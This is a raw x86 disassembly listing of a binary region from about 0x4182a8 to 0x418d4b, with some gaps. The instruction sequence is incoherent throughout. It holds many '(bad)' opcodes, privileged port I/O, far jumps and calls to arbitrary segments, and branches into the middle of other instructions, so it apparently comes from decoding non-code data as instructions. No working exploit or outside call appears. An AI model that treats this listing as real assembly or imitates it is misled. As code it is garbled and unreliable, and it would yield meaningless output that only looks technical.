  4182a8:	ja     0x41830e
  4182aa:	fmul   DWORD PTR [edx+0x5607e0e3]
  4182b0:	out    0x14,al
  4182b2:	fdiv   QWORD PTR [edx+ebp*2]
  4182b5:	int3   
  4182b6:	shl    BYTE PTR cs:[esi+0x7b],1
  4182ba:	jo     0x41823f
  4182bc:	inc    edi
  4182bd:	fld    QWORD PTR [eax+eax*8+0x13]
  4182c1:	ror    BYTE PTR [edi-0x3aadbaea],cl
  4182c7:	ret    0xbeca
  4182ca:	sbb    bl,BYTE PTR [edx+0x1d7c006c]
  4182d0:	add    al,0x34
  4182d2:	cmc    
  4182d3:	mov    bl,BYTE PTR [ecx+ecx*4-0xc59a44d]
  4182da:	push   ecx
  4182db:	lds    ebp,FWORD PTR [ebp+0x5f]
  4182de:	mov    cl,0x84
  4182e0:	xchg   ebx,eax
  4182e1:	dec    eax
  4182e2:	mov    ds:0xbc2af10,al
  4182e7:	pop    ebp
  4182e8:	and    ebp,DWORD PTR [ecx-0x317042ff]
  4182ee:	adc    bl,cl
  4182f0:	push   ss
  4182f1:	xor    ecx,0x1b5b380e
  4182f7:	nop
  4182f8:	arpl   WORD PTR [esi+0x14cb8800],cx
  4182fe:	mov    eax,ds:0x1e33d67
  418303:	mov    edx,0xca7f1b88
  418308:	cmp    BYTE PTR [esi],al
  41830a:	xlat   BYTE PTR ds:[ebx]
  41830b:	out    dx,eax
  41830c:	cmp    al,0x6b
  41830e:	cs and al,0xc2
  418311:	fsubr  st,st(3)
  418313:	push   ebp
  418314:	mov    edx,0x9445d511
  418319:	mov    al,ds:0x48400589
  41831e:	ins    BYTE PTR es:[edi],dx
  41831f:	ins    BYTE PTR es:[edi],dx
  418320:	push   edx
  418321:	div    ah
  418323:	ficom  DWORD PTR [ecx]
  418325:	sub    BYTE PTR [edx-0x721f8a4f],dh
  41832b:	jns    0x4182e9
  41832d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41832e:	xor    ah,bl
  418330:	xor    esi,DWORD PTR [edi+esi*8-0x202410b0]
  418337:	cmp    ebx,eax
  418339:	sub    dl,al
  41833b:	idiv   BYTE PTR [edx-0xb]
  41833e:	push   ebx
  41833f:	adc    DWORD PTR [edi-0x67ff8cc1],0x73
  418346:	cld    
  418347:	stc    
  418348:	mov    ebx,0x8fbbf649
  41834d:	pop    esi
  41834e:	test   eax,0x33d3e9b5
  418353:	push   0x5d
  418355:	jae    0x41838c
  418357:	jmp    0x39a9156a
  41835c:	sub    al,0x5
  41835e:	pusha  
  41835f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418360:	sub    al,dl
  418362:	fidivr DWORD PTR [ebx-0x7c]
  418365:	xor    ch,BYTE PTR [eax]
  418367:	inc    ebx
  418368:	bnd jo 0x418337
  41836b:	xchg   DWORD PTR [edx],edx
  41836d:	add    dl,BYTE PTR [esi]
  41836f:	adc    BYTE PTR [edi-0xbe05362],ch
  418375:	stos   DWORD PTR es:[edi],eax
  418376:	dec    edx
  418377:	jne    0x418303
  418379:	add    eax,0xc58cbde4
  41837e:	jmp    0x41834a
  418380:	sub    bl,BYTE PTR [ebx+esi*2+0x8]
  418384:	mov    bh,0xdf
  418386:	sbb    al,0x55
  418388:	dec    eax
  418389:	vpaddsb ymm7,ymm5,YMMWORD PTR [eax+0x1f95dd]
	...
  4183f1:	add    BYTE PTR [eax],al
  4183f3:	add    ah,bl
  4183f5:	mov    bl,0x3f
  4183f7:	push   eax
  4183f8:	jg     0x4183d6
  4183fa:	(bad)  
  4183fb:	mov    edi,0x14d871ac
  418400:	mov    ecx,0x94b1772b
  418405:	add    BYTE PTR [ecx],al
  418407:	add    BYTE PTR [ecx+eax*1],al
  41840a:	add    BYTE PTR [eax],al
  41840c:	xchg   ebx,eax
  41840d:	push   es
  41840e:	retf   
  41840f:	psraw  mm6,QWORD PTR [edi+0x7266c68a]
  418416:	mov    ebp,0xf834eebd
  41841b:	in     eax,dx
  41841c:	shr    DWORD PTR [esi-0x71],0x7a
  418420:	sub    DWORD PTR [ecx-0x482a57fb],0xbe211b32
  41842a:	push   esi
  41842b:	int    0x44
  41842d:	pop    eax
  41842e:	lods   eax,DWORD PTR ds:[esi]
  41842f:	fild   DWORD PTR ds:0xcd7be054
  418435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418436:	jge    0x418464
  418438:	xchg   edx,eax
  418439:	adc    ecx,DWORD PTR [edi]
  41843b:	lahf   
  41843c:	rcr    DWORD PTR [eax-0x16],0x9d
  418440:	fwait
  418441:	adc    cl,dl
  418443:	sbb    ecx,DWORD PTR ss:[eax-0x69]
  418447:	inc    edx
  418448:	mov    eax,ds:0x92ccddab
  41844d:	jnp    0x418418
  41844f:	mov    eax,0xa4185b7f
  418454:	or     al,0x97
  418456:	sti    
  418457:	shr    BYTE PTR [ebp+0x5f029987],1
  41845d:	mov    ah,0x53
  41845f:	push   es
  418460:	retf   
  418461:	mov    esp,DWORD PTR [ebx-0x180c2bbd]
  418467:	jmp    0x41846d
  418469:	mov    ecx,0x82795346
  41846e:	adc    al,0x50
  418470:	sbb    al,0x59
  418472:	cmp    DWORD PTR [esi+0x14],ebx
  418475:	sub    BYTE PTR [esi+0x27],bl
  418478:	jle    0x4184e2
  41847a:	xor    edx,DWORD PTR [edx]
  41847c:	sbb    al,0x53
  41847e:	jmp    0x6616:0xb4134996
  418485:	dec    ebx
  418486:	mov    WORD PTR [ebx],es
  418488:	or     esp,DWORD PTR [esp+edx*1]
  41848b:	popf   
  41848c:	add    dl,BYTE PTR [ebp+0x11ffbe01]
  418492:	arpl   bp,bp
  418494:	sbb    BYTE PTR [esi-0x11642a85],dh
  41849a:	imul   eax,DWORD PTR [esi+edi*8+0x6f],0x5de42fad
  4184a2:	(bad)  
  4184a4:	outs   dx,DWORD PTR ds:[esi]
  4184a5:	dec    ebx
  4184a6:	leave  
  4184a7:	call   0xcf5a2a09
  4184ac:	sub    ch,BYTE PTR [ecx]
  4184ae:	jo     0x418462
  4184b0:	ret    
  4184b1:	stos   DWORD PTR es:[edi],eax
  4184b2:	test   al,0x4
  4184b4:	xchg   ecx,eax
  4184b5:	jmp    0x41850a
  4184b7:	mov    ecx,0x1024b618
  4184bc:	dec    esp
  4184bd:	push   ebx
  4184be:	mov    ebp,0xdd2e375c
  4184c3:	pop    ecx
  4184c4:	mov    ebp,0xf675103a
  4184c9:	call   0x5703:0x7a3f830e
  4184d0:	pop    es
  4184d1:	cmp    edx,DWORD PTR [ecx-0x43]
  4184d4:	mov    bh,0xea
  4184d6:	xchg   ebx,eax
  4184d7:	and    eax,0x2bb1f3a5
  4184dc:	or     al,0x7e
  4184de:	loope  0x4184cd
  4184e0:	mov    bh,0x6b
  4184e3:	add    esp,DWORD PTR [ecx-0x11]
  4184e6:	(bad)  
  4184e7:	sub    dl,cl
  4184e9:	rol    BYTE PTR [ecx],1
  4184eb:	or     bl,bh
  4184ed:	or     BYTE PTR [edx],dl
  4184ef:	ret    
  4184f0:	js     0x418541
  4184f2:	div    BYTE PTR [ebx]
  4184f4:	icebp  
  4184f5:	rcl    DWORD PTR [edx],cl
  4184f7:	cmc    
  4184f8:	shl    ecx,1
  4184fa:	cmp    ah,dl
  4184fc:	push   edx
  4184fd:	das    
  4184fe:	aam    0xb6
  418500:	mov    cl,BYTE PTR [edi]
  418502:	cs loop 0x4184f2
  418505:	push   edx
  418506:	jp     0x418523
  418508:	xor    BYTE PTR [ecx+0x36],al
  41850b:	repz and eax,0xbab17f
	...
  418571:	add    BYTE PTR [eax],al
  418573:	add    BYTE PTR [ecx-0x7],al
  418576:	mov    ebx,ebx
  418578:	mov    ebx,0x26fb51fb
  41857d:	lods   al,BYTE PTR ds:[esi]
  41857e:	imul   dl
  418580:	popa   
  418581:	das    
  418582:	and    al,0x2f
  418584:	cwde   
  418585:	add    DWORD PTR [ecx],eax
  418587:	add    BYTE PTR [ecx+eax*1],al
  41858a:	add    BYTE PTR [eax],al
  41858c:	cmp    DWORD PTR [ebp+edi*4-0x49],esi
  418590:	fistp  DWORD PTR [esi+0x3b21e4ca]
  418596:	fisubr DWORD PTR [esi-0x36d0f7a2]
  41859c:	add    edx,ecx
  41859e:	loop   0x418557
  4185a0:	arpl   WORD PTR [ebx-0x7e908b8f],bp
  4185a6:	es push cs
  4185a8:	cld    
  4185a9:	jle    0x418606
  4185ab:	pusha  
  4185ac:	inc    ebx
  4185ad:	aaa    
  4185ae:	into   
  4185af:	inc    esp
  4185b0:	add    al,dl
  4185b2:	addr16 sahf 
  4185b4:	cld    
  4185b5:	mov    ecx,0x5f44673
  4185ba:	(bad)  [ebx-0x1f]
  4185bd:	jo     0x418561
  4185bf:	inc    edi
  4185c0:	gs adc dl,al
  4185c3:	gs aam 0x80
  4185c6:	repz pop es
  4185c8:	xor    eax,0xd00515c6
  4185cd:	jge    0x418632
  4185cf:	shl    BYTE PTR [ebx-0x5ac3bfd8],1
  4185d5:	fs (bad) 
  4185d7:	stc    
  4185d8:	add    BYTE PTR ds:0xf87629b6,dh
  4185de:	push   ecx
  4185df:	cmp    eax,0x1fd446b8
  4185e4:	pop    es
  4185e5:	into   
  4185e6:	xlat   BYTE PTR ds:[ebx]
  4185e7:	pop    esi
  4185e8:	ins    BYTE PTR es:[edi],dx
  4185e9:	pop    ecx
  4185ea:	inc    edx
  4185eb:	mov    bl,0x8c
  4185ed:	scas   eax,DWORD PTR es:[edi]
  4185ee:	or     edx,ecx
  4185f0:	arpl   WORD PTR [esi+0x49],sp
  4185f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185f4:	xor    bh,bh
  4185f6:	dec    edi
  4185f7:	lock mov ch,0xd7
  4185fa:	inc    esi
  4185fb:	mov    al,0xbf
  4185fd:	cmp    BYTE PTR [eax+ebx*2-0x72596f93],bl
  418604:	cli    
  418605:	or     DWORD PTR fs:[edi-0x6911f1c7],esi
  41860c:	movd   mm0,DWORD PTR [edi+0x36e9ea39]
  418613:	in     eax,dx
  418614:	std    
  418615:	out    0xfe,eax
  418617:	(bad)  
  418618:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418619:	loope  0x418617
  41861b:	shr    DWORD PTR [esi+0x49f9f366],cl
  418621:	iret   
  418622:	cld    
  418623:	xor    dh,cl
  418625:	int3   
  418626:	xchg   ebp,eax
  418627:	xlat   BYTE PTR ds:[ebx]
  418628:	push   ebp
  418629:	sbb    cl,BYTE PTR [eax]
  41862b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41862c:	sub    DWORD PTR [ebp-0x6c9255d5],ebx
  418632:	dec    BYTE PTR [edi-0x50]
  418635:	cs hlt 
  418637:	and    eax,DWORD PTR [eax-0x5b]
  41863a:	cld    
  41863b:	fisub  DWORD PTR [edx-0x1f1d9d04]
  418641:	int3   
  418642:	jmp    0x811cc3f
  418647:	sub    al,0x92
  418649:	and    ebx,0xbde240e5
  41864f:	aam    0x94
  418651:	outs   dx,BYTE PTR ds:[esi]
  418652:	call   0x989d:0xc9c23461
  418659:	mov    dh,0xa7
  41865b:	scas   eax,DWORD PTR es:[edi]
  41865c:	(bad)  
  41865f:	mov    eax,0xf60eb1b2
  418664:	xor    al,0x59
  418666:	ins    DWORD PTR es:[edi],dx
  418667:	clc    
  418668:	pushf  
  418669:	jge    0x41864e
  41866b:	mov    dh,0x54
  41866d:	dec    eax
  41866e:	clc    
  41866f:	dec    edi
  418670:	mov    edi,0x81a31909
  418675:	loopne 0x41862c
  418677:	mov    ebp,0x5893e9ee
  41867c:	fmul   st,st(2)
  41867e:	out    dx,eax
  41867f:	push   ebx
  418680:	ret    
  418681:	pop    ecx
  418682:	sub    BYTE PTR [ecx],dh
  418684:	pop    ds
  418685:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418687:	mov    ds:0xc1344e4,al
  41868c:	push   ebx
  41868d:	retf   
  41868e:	mov    al,0xf7
	...
  4186f4:	xchg   ebx,eax
  4186f5:	sub    BYTE PTR [eax-0x604344c4],ah
  4186fb:	scas   eax,DWORD PTR es:[edi]
  4186fc:	or     al,0x8d
  4186fe:	cmp    edx,edx
  418700:	(bad)  
  418701:	das    
  418702:	in     al,0xf2
  418704:	pushf  
  418705:	add    al,BYTE PTR [ecx]
  418707:	add    BYTE PTR [ecx+eax*1],al
  41870a:	add    BYTE PTR [eax],al
  41870c:	push   edi
  41870d:	call   0xc9ee:0x271de22e
  418714:	lock in eax,0x8f
  418717:	xchg   edi,eax
  418718:	dec    esp
  418719:	or     BYTE PTR ds:0xd801f3e4,ah
  41871f:	dec    esi
  418720:	pop    es
  418721:	inc    ecx
  418722:	inc    esp
  418723:	icebp  
  418724:	pop    es
  418725:	push   esi
  418726:	mov    bh,0x52
  418728:	lds    ecx,FWORD PTR [edx+0x18446151]
  41872e:	and    eax,0xc18b9b1f
  418733:	jle    0x4187a4
  418735:	cld    
  418736:	jl     0x418791
  418738:	adc    ebx,DWORD PTR [eax+ebx*1-0x284d4a9d]
  41873f:	add    eax,0x5b52b3d
  418744:	cmp    al,0x67
  418746:	dec    edi
  418747:	call   0x39de775e
  41874c:	xor    BYTE PTR [ecx],dl
  41874e:	enter  0xa292,0xd5
  418752:	adc    BYTE PTR es:[eax],dl
  418755:	outs   dx,BYTE PTR ds:[esi]
  418756:	clc    
  418757:	push   ss
  418758:	stc    
  418759:	test   bh,0xe
  41875c:	loopne 0x418739
  41875e:	mov    ecx,ebx
  418760:	ins    BYTE PTR es:[edi],dx
  418761:	fidiv  WORD PTR [ebx-0x2fc7f448]
  418767:	jg     0x41877f
  418769:	push   ecx
  41876a:	sti    
  41876b:	or     eax,0x167cc4f7
  418770:	sub    dh,dh
  418772:	mov    esp,0x9c22fb75
  418777:	cmp    bl,BYTE PTR [ebx-0x9592625]
  41877d:	and    bh,0x14
  418780:	in     eax,dx
  418781:	shl    BYTE PTR fs:[esi+eiz*8],cl
  418785:	sub    edi,DWORD PTR [esi]
  418787:	or     ebp,esp
  418789:	xor    DWORD PTR [edx-0x3b01dee1],edi
  41878f:	dec    edi
  418790:	lds    edi,FWORD PTR [edx]
  418792:	mov    bh,dl
  418794:	lock mov ds:0xb4105d87,eax
  41879a:	xchg   BYTE PTR [ecx+esi*8-0x50c158cc],ah
  4187a1:	push   es
  4187a2:	lahf   
  4187a3:	clc    
  4187a4:	or     BYTE PTR [ebx-0x132284d7],ch
  4187aa:	add    DWORD PTR [ebx-0x5572f015],0xf00a5e4e
  4187b4:	dec    edx
  4187b5:	ret    0xee4d
  4187b8:	mov    dl,0xd6
  4187ba:	je     0x41882c
  4187bc:	je     0x418823
  4187be:	lahf   
  4187bf:	stos   DWORD PTR es:[edi],eax
  4187c0:	inc    ecx
  4187c1:	cmp    al,0xd0
  4187c3:	lods   al,BYTE PTR ds:[esi]
  4187c4:	lea    edi,[esi+0x38031c12]
  4187ca:	pop    ds
  4187cb:	sti    
  4187cc:	add    ecx,esp
  4187ce:	mov    edx,0x59d5490b
  4187d3:	je     0x4187e7
  4187d5:	inc    ax
  4187d7:	fdiv   st(4),st
  4187d9:	sbb    esp,edi
  4187db:	mov    edi,0x9f4a00ec
  4187e0:	pusha  
  4187e1:	mov    ebx,0x90b8c8e5
  4187e6:	int3   
  4187e7:	jg     0x418809
  4187e9:	cmp    edx,DWORD PTR [edx-0xa]
  4187ec:	std    
  4187ed:	cmp    al,BYTE PTR [edi-0x27]
  4187f0:	lock leave 
  4187f2:	xor    edx,DWORD PTR ds:[esp+eax*8+0x23]
  4187f7:	push   edx
  4187f8:	sar    ecx,1
  4187fa:	test   DWORD PTR [esi+0x46a91ccf],0xca7d2d62
  418804:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418805:	nop
  418806:	mov    edi,0xff5be1e3
  41880b:	test   DWORD PTR [esi],edx
  41880d:	pop    edi
  41880e:	test   DWORD PTR [ebp+0x0],eax
	...
  418874:	xchg   esp,eax
  418875:	enter  0x4337,0x7f
  418879:	push   esp
  41887b:	fbld   TBYTE PTR [esi+0x369c3acd]
  418881:	dec    edx
  418882:	call   0x1452941
  418887:	add    BYTE PTR [ecx+eax*1],al
  41888a:	add    BYTE PTR [eax],al
  41888c:	adc    eax,0xe655a346
  418891:	pop    ecx
  418892:	sbb    ah,ah
  418894:	jl     0x418825
  418896:	int    0x4d
  418898:	sub    bh,bh
  41889a:	ins    BYTE PTR es:[edi],dx
  41889b:	cmp    BYTE PTR [ebx],ch
  41889d:	push   eax
  41889e:	push   esi
  41889f:	or     eax,DWORD PTR cs:[ebp+ebx*1+0x74a64fde]
  4188a7:	xor    DWORD PTR [ecx],esi
  4188a9:	dec    ebp
  4188aa:	jo     0x41891d
  4188ac:	stc    
  4188ad:	ja     0x41883d
  4188af:	mov    bl,0x45
  4188b1:	cwde   
  4188b2:	imul   BYTE PTR [esi+0x4e89f48f]
  4188b8:	aas    
  4188b9:	xchg   esi,eax
  4188ba:	cwde   
  4188bb:	sub    eax,0x7dc93686
  4188c0:	adc    ah,ah
  4188c2:	pop    ecx
  4188c3:	mov    dh,0x0
  4188c5:	inc    ebp
  4188c6:	push   edx
  4188c7:	ss push es
  4188c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188ca:	sub    eax,0x18764c1a
  4188cf:	sbb    DWORD PTR [ebx-0x49],esi
  4188d2:	add    ch,BYTE PTR [edx-0x4871b74c]
  4188d8:	dec    edi
  4188d9:	adc    al,0xd3
  4188db:	pop    ecx
  4188dc:	in     al,dx
  4188dd:	out    0xd4,al
  4188df:	pop    edx
  4188e0:	pop    esp
  4188e1:	cli    
  4188e2:	jmp    0xbff2:0xf9687329
  4188e9:	test   DWORD PTR [edi+0x7c3399ce],ebp
  4188ef:	mov    ecx,0xb13876bb
  4188f4:	call   0x91cd:0x9ec98af6
  4188fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188fc:	and    dl,BYTE PTR [ebp+0x38]
  4188ff:	rol    esi,0xf7
  418902:	sbb    ecx,DWORD PTR [edx-0x618ad1d0]
  418908:	rcl    DWORD PTR [edi+esi*2-0x33],0x53
  41890d:	xor    eax,0x9703055a
  418912:	mov    eax,ds:0x7db652f6
  418917:	xor    DWORD PTR [ebx+0x4841b584],ebp
  41891d:	jp     0x41897e
  41891f:	pop    esp
  418920:	sbb    edi,DWORD PTR [ebx+0x32]
  418923:	sar    BYTE PTR [edi+0x37],cl
  418926:	fiadd  DWORD PTR [esi]
  418928:	into   
  418929:	mov    ebx,0xb83ebe0c
  41892e:	mov    dh,0x16
  418930:	aad    0x56
  418932:	shl    BYTE PTR [edi-0xd],1
  418935:	pop    ds
  418936:	lahf   
  418937:	dec    ecx
  418938:	mov    cl,0x5d
  41893a:	mov    ecx,cs
  41893c:	mov    gs,WORD PTR [ebx+esi*8+0x42d11fde]
  418943:	sub    eax,0x37f3d1cf
  418948:	call   0xce8d:0xce667ba3
  41894f:	test   DWORD PTR [ebp+0x635dcaa5],esi
  418955:	dec    ecx
  418956:	mov    ebx,0x8e94146a
  41895b:	fsubr  DWORD PTR [edi+ecx*1]
  41895e:	sbb    eax,0x1a51ab54
  418963:	out    dx,eax
  418964:	stos   DWORD PTR es:[edi],eax
  418965:	lds    esp,FWORD PTR [edi-0x535dc3b8]
  41896b:	into   
  41896c:	or     dl,0x6b
  41896f:	mov    edx,0xe758a29e
  418974:	cmp    ecx,esi
  418976:	jns    0x418974
  418978:	div    DWORD PTR [edx-0x71]
  41897b:	inc    DWORD PTR [ecx+ebx*4-0x1b9778e7]
  418982:	inc    ebp
  418983:	xchg   bh,dl
  418985:	outs   dx,DWORD PTR ds:[esi]
  418986:	sti    
  418987:	stc    
  418988:	fdivr  DWORD PTR [edx-0x7434ef65]
  41898e:	add    al,0xb2
	...
  4189f4:	mov    WORD PTR [ecx-0x28a2e9ac],ss
  4189fa:	into   
  4189fb:	fwait
  4189fc:	add    bh,cl
  4189fe:	mov    ebp,0xebdcaf69
  418a03:	test   eax,0x104a4
  418a08:	add    al,0x1
  418a0a:	add    BYTE PTR [eax],al
  418a0c:	dec    esi
  418a0d:	fneni(8087 only) 
  418a0f:	xchg   esi,eax
  418a11:	mov    bl,0x5a
  418a13:	mov    esi,0x64f85316
  418a18:	push   ss
  418a19:	push   esp
  418a1a:	sub    DWORD PTR [ebx+eiz*4-0x9eb719d],esp
  418a21:	dec    esi
  418a22:	out    0xfb,al
  418a24:	retf   
  418a25:	call   0x6197749
  418a2a:	sub    BYTE PTR [eax+0x3e8532fb],0xd7
  418a31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a32:	mov    al,ds:0x989915b1
  418a37:	(bad)  
  418a38:	imul   BYTE PTR [ebx]
  418a3a:	jne    0x418a01
  418a3c:	mov    WORD PTR [esi],?
  418a3e:	into   
  418a3f:	xor    BYTE PTR [ecx+esi*1+0x5d749442],bh
  418a46:	out    dx,eax
  418a47:	add    eax,0xeafb613f
  418a4c:	jmp    0xf7f7:0xff813887
  418a53:	jno    0x418a7b
  418a55:	push   es
  418a56:	jo     0x418ab3
  418a58:	imul   edi,DWORD PTR [edx-0x48d614e3],0xffffff9f
  418a5f:	sahf   
  418a60:	loopne 0x4189ef
  418a62:	xchg   edi,eax
  418a63:	clc    
  418a64:	mov    al,0x62
  418a66:	sbb    BYTE PTR [edx+esi*8-0x75],cl
  418a6a:	dec    eax
  418a6b:	jnp    0x418a8c
  418a6d:	sysenter 
  418a6f:	and    esi,edx
  418a71:	xlat   BYTE PTR ds:[ebx]
  418a72:	sub    al,0x6
  418a74:	push   0x7d6eff59
  418a79:	cmp    al,0x53
  418a7b:	push   edi
  418a7c:	mov    dh,0x9c
  418a7e:	sahf   
  418a7f:	mov    ebp,0x873a7cc7
  418a84:	add    DWORD PTR [eax],ebx
  418a86:	mov    edx,DWORD PTR [edx]
  418a88:	fldcw  WORD PTR [ebx]
  418a8a:	je     0x418a53
  418a8c:	div    BYTE PTR [esi]
  418a8e:	jns    0x418acb
  418a90:	(bad)  [edx]
  418a92:	adc    BYTE PTR [edx-0x1d854f15],bh
  418a98:	adc    DWORD PTR ds:0xcd5a2b44,ebp
  418a9e:	(bad)  
  418a9f:	ficomp WORD PTR [ebp+0x3c]
  418aa2:	icebp  
  418aa3:	dec    esi
  418aa4:	aaa    
  418aa5:	das    
  418aa6:	leave  
  418aa7:	push   ss
  418aa8:	cmp    eax,0xdbd3e0f5
  418aad:	aas    
  418aae:	scas   al,BYTE PTR es:[edi]
  418aaf:	xor    DWORD PTR [esi],ebp
  418ab1:	xchg   ecx,eax
  418ab2:	xchg   edi,eax
  418ab3:	xor    ecx,edx
  418ab5:	jns    0x418ab8
  418ab7:	ret    0xcdf1
  418aba:	das    
  418abb:	test   eax,0xeed3732
  418ac0:	mov    WORD PTR [eax-0x1d],fs
  418ac3:	fwait
  418ac4:	cmp    ax,0x2466
  418ac8:	imul   edi,eax,0x71
  418acb:	sub    dh,BYTE PTR [esi]
  418acd:	mov    edi,0x10722535
  418ad2:	jae    0x418b3c
  418ad4:	jmp    0x570850e9
  418ad9:	mov    DWORD PTR [ebp-0x57],0x3ef74d
  418ae0:	mov    al,ds:0xab4adc0d
  418ae5:	ret    
  418ae6:	call   0xf856:0xa6da6d4
  418aed:	fisub  DWORD PTR [edi]
  418aef:	imul   edx,eax,0x2ff33619
  418af5:	push   ecx
  418af6:	icebp  
  418af7:	push   0x8384b3d0
  418afc:	adc    BYTE PTR [ebp+0x778a89ae],dh
  418b02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b03:	aas    
  418b04:	mov    al,ds:0xc492dcd3
  418b09:	xor    ebx,DWORD PTR [ebx-0x13]
  418b0c:	cmp    al,0xdc
  418b0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b0f:	or     eax,0x0
	...
  418b74:	jl     0x418b89
  418b76:	test   DWORD PTR [edx],esi
  418b78:	out    dx,eax
  418b79:	mov    dh,0xff
  418b7b:	pop    edi
  418b7c:	sar    BYTE PTR [ebp+0x3b],1
  418b7f:	in     eax,0x89
  418b81:	push   esi
  418b82:	into   
  418b83:	xchg   BYTE PTR [eax+0x4000105],ch
  418b89:	add    DWORD PTR [eax],eax
  418b8b:	add    BYTE PTR [ecx+0x4c88380a],dh
  418b91:	ror    DWORD PTR [edx+0x37255a9d],0x37
  418b98:	xor    esi,esi
  418b9a:	xlat   BYTE PTR ds:[ebx]
  418b9b:	clc    
  418b9c:	mov    eax,ds:0x662394da
  418ba1:	dec    eax
  418ba2:	outs   dx,DWORD PTR ds:[esi]
  418ba3:	je     0x418bf0
  418ba5:	lods   al,BYTE PTR ds:[esi]
  418ba6:	jns    0x418c23
  418ba8:	call   0x41d5db6f
  418bad:	xor    BYTE PTR [ecx-0x59],dh
  418bb0:	pop    edx
  418bb1:	stos   DWORD PTR es:[edi],eax
  418bb2:	daa    
  418bb3:	pop    eax
  418bb4:	daa    
  418bb5:	mov    bl,0x22
  418bb7:	adc    ecx,DWORD PTR [ecx+eax*8]
  418bba:	push   cs
  418bbb:	push   ebx
  418bbc:	dec    eax
  418bbd:	ret    
  418bbe:	push   cs
  418bbf:	(bad)  ds:0x8c084c90
  418bc5:	xor    BYTE PTR [ebx-0x5b398956],dl
  418bcb:	sbb    ah,ah
  418bcd:	inc    eax
  418bce:	js     0x418b8d
  418bd0:	inc    ebx
  418bd1:	js     0x418bdc
  418bd3:	(bad)  
  418bd5:	xchg   ebp,eax
  418bd6:	bound  ebp,QWORD PTR [edi-0x210d695f]
  418bdc:	jl     0x418bd8
  418bde:	inc    edx
  418bdf:	jg     0x418bca
  418be1:	xchg   BYTE PTR [edx],bl
  418be3:	pop    eax
  418be4:	add    al,0x17
  418be6:	(bad)
  418bea:	push   esi
  418beb:	les    esi,FWORD PTR ds:0xee67b15c
  418bf1:	dec    ecx
  418bf2:	lds    ecx,FWORD PTR ds:0xf74fa53d
  418bf8:	cwde   
  418bf9:	sbb    eax,0x19d9b62c
  418bfe:	scas   al,BYTE PTR es:[edi]
  418bff:	jle    0x418baa
  418c01:	jnp    0x418c1c
  418c03:	jno    0x418c47
  418c05:	push   0x24
  418c07:	call   0x18d1d548
  418c0c:	xor    esp,edx
  418c0e:	pop    eax
  418c0f:	fcom   DWORD PTR [esi+0xb]
  418c12:	xor    ecx,DWORD PTR [eax]
  418c14:	jecxz  0x418bcf
  418c16:	ds rcr ah,0xf1
  418c1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c1b:	xor    DWORD PTR [ebx],ebx
  418c1d:	in     eax,0xd0
  418c1f:	into   
  418c20:	vpsubusb ymm1,ymm5,YMMWORD PTR [ecx-0x63]
  418c25:	mov    ecx,0x912beef2
  418c2a:	ret    0x8de2
  418c2d:	add    BYTE PTR [ebp-0x3b],bh
  418c30:	jle    0x418bbe
  418c32:	ffree  st(7)
  418c34:	dec    esi
  418c35:	xor    BYTE PTR [esp+esi*1-0x36],0x7b
  418c3a:	mov    edx,DWORD PTR [edx]
  418c3c:	addr16 inc esi
  418c3e:	ficom  WORD PTR [edi-0x6c]
  418c41:	aaa    
  418c42:	popf   
  418c43:	add    DWORD PTR [edx+0x6c3d5edc],0x48
  418c4a:	out    dx,eax
  418c4b:	push   ds
  418c4c:	sbb    ecx,edx
  418c4e:	push   ebx
  418c4f:	adc    esp,DWORD PTR [esp+ebx*1-0x6e]
  418c53:	jmp    0x308e:0xfc5d52f7
  418c5a:	pop    esp
  418c5b:	sub    ecx,DWORD PTR [ebx]
  418c5d:	cmp    al,0x1e
  418c5f:	imul   ecx,ecx,0x940f1a94
  418c65:	das    
  418c66:	push   edx
  418c67:	sbb    ah,dl
  418c69:	leavew 
  418c6b:	add    eax,0x9821576f
  418c70:	add    eax,0x1bd3f16b
  418c75:	adc    ecx,DWORD PTR [ecx]
  418c77:	leave  
  418c78:	cdq    
  418c79:	popa   
  418c7a:	and    eax,0xc2db0999
  418c7f:	push   0x2
  418c81:	out    0x64,al
  418c83:	dec    eax
  418c84:	(bad)  
  418c85:	cmp    eax,0x33ebf05e
  418c8a:	sbb    al,0xcc
  418c8c:	outs   dx,BYTE PTR ds:[esi]
  418c8d:	mov    cl,0xc6
  418c8f:	dec    esp
	...
  418cf4:	sti    
  418cf5:	inc    edx
  418cf6:	out    dx,al
  418cf7:	aas    
  418cf8:	(bad)  
  418cf9:	mov    edi,0x6a1ac6fb
  418cfe:	(bad)  
  418cff:	rcr    BYTE PTR [ecx],cl
  418d01:	imul   eax,DWORD PTR [ecx+0x106ac7b],0x0
  418d08:	add    al,0x1
  418d0a:	add    BYTE PTR [eax],al
  418d0c:	retf   0x1c9c
  418d0f:	sahf   
  418d10:	dec    edx
  418d11:	rcl    BYTE PTR [eax+eiz*8],1
  418d14:	shl    esi,0xa8
  418d17:	iret   
  418d18:	push   0xffffff9d
  418d1a:	test   ecx,eax
  418d1c:	fnsave [edi+0x14]
  418d1f:	mov    edi,0x460062d
  418d24:	dec    ebx
  418d25:	mov    cl,0x53
  418d27:	xor    eax,0xa3c9ab87
  418d2c:	aas    
  418d2d:	or     DWORD PTR [eax+ebx*8-0x3f],eax
  418d31:	sti    
  418d32:	mov    dl,0x9f
  418d34:	retf   
  418d35:	es ins BYTE PTR es:[edi],dx
  418d37:	sub    al,0xe7
  418d39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d3a:	data16 aam 0x3f
  418d3d:	add    ch,BYTE PTR [eax-0x61d2d8ed]
  418d43:	mov    ss,WORD PTR [ecx]
  418d45:	inc    eax
  418d46:	jae    0x418cd3
  418d48:	jb     0x418d0a
  418d4a:	in     eax,dx
  418d4b:	aam    0xd5
